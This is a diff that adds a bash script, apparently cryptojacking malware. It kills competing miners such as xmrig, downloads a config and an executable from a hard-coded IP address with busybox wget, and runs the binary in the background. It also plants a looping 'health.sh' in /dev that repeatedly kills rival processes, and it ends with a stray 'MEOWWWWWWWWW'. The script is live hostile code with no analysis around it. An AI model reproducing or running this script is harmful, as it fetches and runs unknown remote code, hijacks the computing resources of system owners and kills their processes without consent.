@@ -1,0 +1,49 @@
+#!/bin/bash
+pkill softirq
+pkill watcher
+pkill /tmp/a
+
+echo 12334
+pkill -9 xmrig
+
+P="fghgf"
+R="/dev"
+if ! pgrep $P > /dev/null; then
+  rm -rf /dev/shm/$P /tmp/config.json;
+  busybox wget http://193.34.213.150/nuts/lc -O->/tmp/config.json;
+  busybox wget http://193.34.213.150/nuts/x  -O->/tmp/$P;
+  chmod 777 /tmp/$P; 
+  /tmp/$P -c /tmp/config.json -B &
+fi 
+
+A=$(pgrep $P)
+if [ $(echo $A | wc -l) -gt 1 ]; then
+  echo $(echo $A | tail -n +2) | xargs kill
+fi
+
+if ! pgrep "health.sh"; then
+    cat <<'EOF' > "${R}/health.sh"
+while true; do
+    for proc_dir in /proc/[0-9]*; do
+        pid=${proc_dir##*/}
+
+        if strings "/proc/$pid/exe" 2>/dev/null | grep -q xmrig; then
+            kill -9 "$pid"
+            continue
+        fi
+        result=$(ls -l "/proc/$pid/exe" 2>/dev/null)
+        case "$result" in
+            *"(deleted)"* | *"xmrig"* | *"watcher"* | *"/tmp/a"* | *"softirq"* | *"rondo"*
+                kill -9 "$pid"
+                ;;
+        esac
+    done
+    sleep 45
+done
+EOF
+    chmod 777 "${R}/health.sh"
+    ${R}/health.sh &
+fi
+
+
+echo MEOWWWWWWWWW
